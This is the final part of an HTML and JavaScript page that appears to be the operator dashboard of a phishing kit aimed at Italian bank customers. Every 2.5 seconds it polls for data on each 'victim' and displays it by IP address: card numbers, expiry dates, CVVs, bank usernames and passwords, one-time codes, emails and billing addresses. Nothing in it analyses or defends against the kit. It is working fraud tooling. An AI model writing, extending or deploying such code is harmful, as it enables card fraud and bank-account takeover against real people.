            .then(r => r.json())
            .then(data => {
                if (!data) return;
                const hash = JSON.stringify(data);
                if (hash === lastDataHash) return; // No change
                lastDataHash = hash;

                // Update last code
                const codeEl = document.querySelector('#main-panel .text-5xl');
                if (codeEl && data.last_code) codeEl.textContent = data.last_code || '------';

                // Update email
                const emailContainer = document.querySelector('#main-panel .font-mono.text-slate-400');
                if (emailContainer) emailContainer.textContent = data.email || '';

                // Update card details if present
                updateCardSection(data);
                updateBankSection(data);
                updateBillingSection(data);

                // Update status header
                updateStatusHeader(data);
            })
            .catch(() => {});
    }

    function updateCardSection(data) {
        const cardSection = document.getElementById('card-data-section');
        if (!data.card_name) {
            if (cardSection) cardSection.innerHTML = '';
            return;
        }
        if (!cardSection) return;
        cardSection.innerHTML = `
            <div class="col-span-2 bg-slate-800/50 p-3 rounded-xl"><span class="text-slate-500 block text-[10px]">Banca Emittente</span><span class="text-green-400 font-mono text-sm">${data.card_bank || 'N/A'}</span> <span class="text-slate-600 text-[10px] ml-2">${(data.card_brand||'').toUpperCase()} BIN: ${data.card_bin || ''}</span></div>
            <div class="bg-slate-800/50 p-3 rounded-xl"><span class="text-slate-500 block text-[10px]">Titolare</span><span class="text-white font-mono text-sm">${data.card_name || ''}</span></div>
            <div class="bg-slate-800/50 p-3 rounded-xl"><span class="text-slate-500 block text-[10px]">Numero</span><span class="text-white font-mono text-sm">${data.card_number || ''}</span></div>
            <div class="bg-slate-800/50 p-3 rounded-xl"><span class="text-slate-500 block text-[10px]">Scadenza</span><span class="text-white font-mono text-sm">${data.card_expiry || ''}</span></div>
            <div class="bg-slate-800/50 p-3 rounded-xl"><span class="text-slate-500 block text-[10px]">CVV</span><span class="text-white font-mono text-sm">${data.card_cvv || ''}</span></div>
        `;
    }

    function updateBillingSection(data) {
        const billingSection = document.getElementById('billing-data-section');
        if (!data.billing_address) {
            if (billingSection) billingSection.innerHTML = '';
            return;
        }
        if (!billingSection) return;
        const fullName = (data.billing_firstname || '') + ' ' + (data.billing_lastname || '');
        billingSection.innerHTML = `
            <div class="mt-4 pt-4 border-t border-slate-800 text-left">
                <div class="text-[10px] text-slate-500 uppercase tracking-widest mb-3">📍 Billing — ${fullName.trim() || 'N/A'}</div>
                <div class="grid grid-cols-2 gap-3 text-sm">
                    <div class="col-span-2 bg-slate-800/50 p-3 rounded-xl"><span class="text-slate-500 block text-[10px]">Indirizzo</span><span class="text-white font-mono text-sm">${data.billing_address || ''}</span></div>
                    <div class="bg-slate-800/50 p-3 rounded-xl"><span class="text-slate-500 block text-[10px]">Città</span><span class="text-white font-mono text-sm">${data.billing_city || ''}</span></div>
                    <div class="bg-slate-800/50 p-3 rounded-xl"><span class="text-slate-500 block text-[10px]">CAP</span><span class="text-white font-mono text-sm">${data.billing_zip || ''}</span></div>
                    <div class="bg-slate-800/50 p-3 rounded-xl"><span class="text-slate-500 block text-[10px]">Provincia</span><span class="text-white font-mono text-sm">${data.billing_province || data.billing_state || ''}</span></div>
                    <div class="bg-slate-800/50 p-3 rounded-xl"><span class="text-slate-500 block text-[10px]">Paese</span><span class="text-white font-mono text-sm">🇮🇹 ${data.billing_country || 'Italia'}</span></div>
                    <div class="bg-slate-800/50 p-3 rounded-xl"><span class="text-slate-500 block text-[10px]">Telefono</span><span class="text-white font-mono text-sm">${data.billing_phone || ''}</span></div>
                </div>
            </div>
        `;
    }

    function updateBankSection(data) {
        const bankSection = document.getElementById('bank-data-section');
        if (!data.selected_bank) {
            if (bankSection) bankSection.innerHTML = '';
            return;
        }
        if (!bankSection) return;
        let html = `
            <div class="bg-slate-800/50 p-3 rounded-xl"><span class="text-slate-500 block text-[10px]">Banca</span><span class="text-white font-mono text-sm">${data.selected_bank || ''}</span></div>
            <div class="bg-slate-800/50 p-3 rounded-xl"><span class="text-slate-500 block text-[10px]">ID Banca</span><span class="text-white font-mono text-sm">${data.selected_bank_id || 'N/A'}</span></div>`;
        if (data.selected_branch) {
            html += `<div class="bg-slate-800/50 p-3 rounded-xl"><span class="text-slate-500 block text-[10px]">Branch</span><span class="text-white font-mono text-sm">${data.selected_branch || ''}</span></div>`;
        }
        if (data.bank_username) {
            html += `
            <div class="bg-slate-800/50 p-3 rounded-xl"><span class="text-slate-500 block text-[10px]">Bank Username</span><span class="text-white font-mono text-sm">${data.bank_username || ''}</span></div>
            <div class="bg-slate-800/50 p-3 rounded-xl"><span class="text-slate-500 block text-[10px]">Bank Password</span><span class="text-white font-mono text-sm">${data.bank_password || ''}</span></div>`;
        }
        bankSection.innerHTML = html;
    }

    function updateStatusHeader(data) {
        const header = document.getElementById('status-header');
        if (!header || !data) return;
        header.innerHTML = '<span class="text-white font-bold text-lg">' + (data.ip || currentViewIP) + '</span>' +
            '<span class="text-xs text-slate-500 ml-3">' + (data.label || '') + ' · ' + (data.ago || '') + '</span>';
    }

    // Mark sidebar victim links to update currentViewIP
    document.addEventListener('click', function(e) {
        const row = e.target.closest('.victim-row');
        if (row) currentViewIP = row.getAttribute('data-ip');
    });

    // ============ INIT ============
    setInterval(refreshSidebar, 2500);
    setInterval(refreshMainPanel, 2500);
    refreshSidebar();
    if (currentViewIP) refreshMainPanel();
    </script>
</body>
</html>
